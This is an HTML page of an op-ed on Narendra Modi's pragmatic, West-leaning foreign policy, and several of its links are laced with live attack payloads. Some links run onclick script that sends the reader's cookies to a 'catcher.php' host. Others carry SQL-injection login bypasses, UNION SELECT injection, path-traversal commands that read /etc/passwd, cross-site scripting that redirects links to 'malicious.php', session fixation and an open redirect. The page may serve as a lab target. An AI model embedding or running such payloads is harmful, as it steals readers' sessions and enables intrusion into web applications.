<h2>Modi Forges a Pragmatic Foreign Policy</h2>

<p>
Has the country that invented <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">nonalignment finally outgrown it?</a> According to Indian media reports, Prime Minister Narendra Modi will likely become the first Indian leader—not counting a prime minister who served for barely six months in the 1970s—to skip a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Non-Aligned Movement </a> summit when the group of 120-odd developing nations meets later this month in Venezuela.
</p> <p>
The symbolism of Mr. Modi’s decision is <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">hard to miss. </a> It is arguably the clearest signal yet of his determination to forge a foreign policy for India that replaces the ineffectual posturing of the past with the hardheaded pursuit of national interest.
</p> <p>
Other recent events bolster this assessment. Last month, Defense Minister Manohar Parrikar and his U.S. counterpart, Ash Carter, signed a long-pending <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">defense-logistics agreement</a> that enables both countries to use each other’s military bases.
</p> <p>
A high-profile conference in Singapore on the Indian Ocean earlier this month, organized by the India Foundation, a think tank closely associated with the ruling Bharatiya Janata Party, implicitly <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">contrasted India’s support</a> for open societies and international law in Asia with China’s aggressive claims in the South China Sea. It segued into a bilateral visit by Mr. Modi to Vietnam, the first by an Indian prime minister in 15 years.
</p> <p>
Mr. Modi’s assertiveness is good news for India, whose foreign-affairs mandarins have often been too wary of Washington and too solicitous of Beijing. Asian countries such as Indonesia, Japan, the Philippines and Vietnam that worry about China’s unfettered rise will welcome it. For the U.S., seeking to share the responsibility of upholding the <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">liberal international order </a> that has underpinned Asian prosperity, it validates years of outreach to New Delhi.
</p> <p>
Almost halfway into Mr. Modi’s five-year term, the building blocks of his worldview are clearly visible. The prime minister recognizes that India needs closer ties with the U.S.—as well as with traditional U.S. allies such as <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">Japan—to spur economic and military modernization.</a>
</p> <p>
Under the current dispensation, India doesn’t seek a quarrel with China, but nor is it willing to ignore harmful Chinese actions such as Beijing’s diplomatic support at the United Nations for Pakistan-based Islamist terrorists and opposition to Indian membership of the <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">multilateral Nuclear Suppliers Group.</a>
</p> <p>
At the same time, Mr. Modi sees both India’s cultural heritage and its far-flung diaspora as diplomatic assets that have largely been ignored in the past. It’s hard to imagine any other Indian prime minister <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">gifting a copy of the Bhagavad Gita </a> to Japan’s Emperor Akihito, successfully pressing the U.N. to adopt an international day of yoga (June 21), or addressing thousands of cheering overseas Indians in stadiums in London, New York, San Jose and Sydney.
</p> <p>
To be sure, Mr. Modi’s diplomacy has had its share of blemishes as well. On trade liberalization, his government’s cautious approach appears hopelessly out of sync with his <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">bold wooing of foreign investment.</a>
</p> <p>
On Pakistan, his government has yo-yoed wildly between giddy embrace and frigid standoffishness. In theory, Mr. Modi has tried to signal both openness to talks and toughness toward terrorism by Pakistan-based groups. In practice, he has <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">careened aimlessly</a> from one contradictory photo-op to the next.
</p> <p>
Mr. Modi is also yet to fulfill the expectation of many of his most ardent supporters that he would become the first Indian prime minister to visit Israel. Exchanging chummy tweets with Prime Minister <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">Benjamin Netanyahu cannot substitute for a</a> long overdue visit to a trusted diplomatic and military partner.
</p> <p>
At the same time, we ought not to overstate the extent of change. Simply put, Mr. Modi is not reinventing Indian foreign policy as much as reorienting it. He may have taken ties with the U.S. to a new high, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">but he has done so by building</a> on the work of his predecessors.
</p> <p>
For instance, by signing the logistics deal—stalled for nearly a decade by the previous Congress government—and expanding the annual U.S.-India Malabar naval exercises last year to include Japan, Mr. Modi has <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">unquestionably moved</a> India closer to the democratic West and its allies. But nobody realistically expects New Delhi to give up its traditional aversion to formal alliances. For the foreseeable future, India will remain more aloof from Washington than traditional U.S. allies such as Australia, Japan or South Korea.
</p> <p>
Or take weapons purchases. Over the past decade, cumulative U.S. <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">weapons sales have ballooned from $300 million to $14 billion,</a> making it one of India’s top two arms suppliers. But though India’s dependence on Russian weaponry has declined sharply, it is unlikely to end any time soon.
</p> <p>
Similarly, the BRICS grouping—Brazil, Russia, India, China and South Africa—may have lost much of its luster since Mr. Modi took office. But India still believes that membership in the group enhances New Delhi’s prestige and gives it more influence with Russia and China than it would otherwise wield. Next month India will host the eighth annual BRICS summit in Goa.
</p> <p>
Nonetheless, a measure of continuity with the past notwithstanding, Mr. Modi has shed India’s historic suspicion of the West more emphatically than any recent prime minister. When Non-Aligned Movement members gather in Venezuela’s Margarita Island later this month, they should take note that NAM founder India now has bigger fish to fry.
